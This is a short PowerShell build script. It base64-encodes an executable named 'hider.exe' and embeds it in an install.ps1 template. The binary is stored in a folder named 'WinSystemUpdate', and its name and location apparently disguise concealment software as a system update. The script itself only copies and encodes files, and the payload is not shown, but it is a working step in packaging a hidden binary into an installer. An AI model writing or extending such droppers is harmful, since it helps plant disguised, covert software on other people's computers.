# Run this once on your PC to regenerate install.ps1 with the embedded hider.exe
$b64 = [Convert]::ToBase64String([System.IO.File]::ReadAllBytes("$env:LOCALAPPDATA\WinSystemUpdate\hider.exe"))
$template = Get-Content "C:\Users\user\Downloads\rd-files\install_template.ps1" -Raw
$final = $template -replace 'HIDER_B64_PLACEHOLDER', $b64
Set-Content "C:\Users\user\Downloads\rd-files\install.ps1" $final -Encoding UTF8
Write-Host "install.ps1 built: $((Get-Item 'C:\Users\user\Downloads\rd-files\install.ps1').Length) bytes"
